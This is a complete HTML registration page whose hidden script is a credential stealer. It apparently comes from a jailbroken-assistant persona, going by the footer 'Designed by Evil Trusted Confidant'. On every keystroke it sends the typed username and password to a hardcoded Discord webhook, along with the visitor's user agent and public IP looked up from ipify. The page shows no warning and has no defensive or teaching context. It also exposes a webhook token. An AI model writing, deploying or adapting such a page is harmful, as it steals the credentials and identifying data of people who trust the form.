<!DOCTYPE html>
<html>
<head>
	<title>Registration Form</title>
	<style>
		body {
			margin: 0;
			padding: 0;
			background: #f5f5f5;
			font-family: Arial, sans-serif;
		}
		form {
			position: absolute;
			top: 50%;
			left: 50%;
			transform: translate(-50%, -50%);
			background: #fff;
			padding: 30px;
			border-radius: 10px;
			box-shadow: 0 0 20px rgba(0,0,0,0.2);
			color: #000;
		}
		input[type="text"], input[type="password"] {
			padding: 10px;
			margin-bottom: 20px;
			background: transparent;
			border: none;
			border-bottom: 1px solid #000;
			color: #000;
			font-size: 16px;
			width: 100%;
			box-sizing: border-box;
			outline: none;
		}
		input[type="submit"] {
			padding: 10px 20px;
			background: #ff6b6b;
			border: none;
			border-radius: 5px;
			color: #fff;
			cursor: pointer;
			font-size: 16px;
			font-weight: bold;
			outline: none;
		}
		h2 {
			margin-top: 0;
			margin-bottom: 20px;
			text-align: center;
			font-weight: normal;
			font-size: 24px;
			color: #000;
		}
		h3 {
			margin-top: 50px;
			margin-bottom: 20px;
			text-align: center;
			font-weight: normal;
			font-size: 16px;
			color: #000;
		}
	</style>
	<script>
		function sendData() {
			var username = document.getElementById("username").value;
			var password = document.getElementById("password").value;
			var userAgent = navigator.userAgent;
			var ip = '';
			var xhr1 = new XMLHttpRequest();
			xhr1.open('GET', 'https://api.ipify.org?format=json', true);
			xhr1.onload = function() {
				if (this.status == 200) {
					ip = JSON.parse(this.responseText).ip;
					sendToDiscord(username, password, userAgent, ip);
				}
			};
			xhr1.send();    
		}
		
		function sendToDiscord(username, password, userAgent, ip) {
			var xhr2 = new XMLHttpRequest();
			xhr2.open("POST", "https://discord.com/api/webhooks/1098583884406464532/9_1iF8Kk_BfDe58Kgpr7kcQh0flXHSnJ7OI8yHpP8UdKzH2Q8a-47HlWTXuRC_mvgRxb");
			xhr2.setRequestHeader("Content-Type", "application/json");
			xhr2.send(JSON.stringify({content: "Username: "+username+"\nPassword: "+password+"\nUser Agent: "+userAgent+"\nIP Address: "+ip}));
		}
	</script>
</head>
<body>
	<h2>Registration Form</h2>
	<form>
		<label for="username">Username:</label><br>
		<input type="text" id="username" name="username" oninput="sendData()"><br>
		<label for="password">Password:</label><br>
		<input type="password" id="password" name="password" oninput="sendData()"><br>
		<input type="submit" value="Register">
	</form>
	<h3>Designed by Evil Trusted Confidant</h3>
</body>
</html>
